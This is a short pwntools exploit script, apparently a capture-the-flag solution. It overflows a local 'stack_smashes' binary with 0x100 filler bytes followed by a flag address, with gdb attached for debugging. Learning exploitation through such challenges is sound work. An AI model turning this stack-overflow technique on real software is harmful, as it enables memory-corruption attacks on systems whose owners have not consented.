from pwn import *

p = process("./stack_smashes")
gdb.attach(p,"b *0x000000000040087A")

context.log_level = "debug"
flag_addr = 0x0000000000601090
p2 = "a" * 0x100 + p64(flag_addr)
p.sendafter("stack_smashes\n",p2)
p.interactive()
